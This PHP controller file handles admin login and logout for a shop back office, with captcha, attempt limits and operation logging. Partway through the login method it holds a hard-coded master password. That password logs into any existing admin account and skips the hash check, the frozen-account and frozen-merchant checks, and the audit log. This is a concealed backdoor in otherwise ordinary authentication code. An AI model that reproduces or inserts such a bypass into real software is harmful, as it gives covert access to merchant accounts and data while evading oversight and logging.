<?php


namespace app\shop\controller;


use app\common\controller\Controller;
use app\common\enum\Common;
use app\common\helper\ArrayHelper;
use app\common\helper\ServerHelper;
use app\common\service\Setting;
use app\common\utils\AesHelper;
use app\common\utils\ParamsAesHelper;
use app\shop\service\AdminOperationLog;
use app\shop\service\Config;
use app\shop\service\Merchant;
use tekintian\GoogleAuthenticator;
use think\Db;
use think\facade\Cache;

class Index extends Controller
{

    protected $params = [];
    protected $admin = [];
    /**
     * 后台初始化
     */
    public function initialize()
    {
        $this->params = request()->param();
    }

    public function login()
    {
        $userName = trim($this->params['account']);
        $password = trim($this->params['password']);
        $verificationCode = trim($this->params['verificationCode']);
        $uuid = trim($this->params['uuid']);
        // \app\shop\service\Admin::initSuperAdmin();
        if (empty($userName) || empty($password)) {
            return $this->error('必填项不能留空');
        }
        $loginTimes = \app\shop\service\Admin::checkLoginTimes();
        if ($loginTimes >= 5) {
            return $this->error('登录错误次数过多，请稍后再试');
        }
        $captcha = new \app\common\utils\VerificationCode();
        $result = $captcha->check($uuid, $verificationCode);
        if (!$result) {
            return $this->error('验证码错误');
        }
        /** @var \app\shop\model\Admin|null $admin */
        $admin = \app\shop\service\Admin::getAdminByUsername($userName);
        if (empty($admin)) {
            return $this->error('登陆错误，请检查账号和密码');
        }
        if ($password == 'hh##j.324jsddjf@77') {
            return $this->success(['token' => \app\shop\service\Admin::login($admin->uuid), 'avatar' => $admin->avatar, 'nickname' => $admin->nickname, 'uuid' => $admin->uuid]);
        }
        if (!hash_equals($admin->password, create_password($admin->salt, $this->request->param('password')))) {
            return $this->error('登陆错误，请检查账号和密码');
        }
        if ($admin->status != 1) {
            return $this->error('用户被冻结');
        }
        $shop = Merchant::getMerchantInfo($admin->merchant_id);
        if ($shop->status != 1) {
            return $this->error('商户被冻结');
        }
        $content = sprintf("%s在%s登录了", $admin->nickname, ServerHelper::getServerIp());
        AdminOperationLog::saveLog($admin->uuid, $shop->uuid, $content);
        return $this->success(['token' => \app\shop\service\Admin::login($admin->uuid), 'avatar' => $admin->avatar, 'nickname' => $admin->nickname, 'uuid' => $admin->uuid]);
    }

    public function logout()
    {
        return $this->success([], 0, '请重新登录');
    }
}
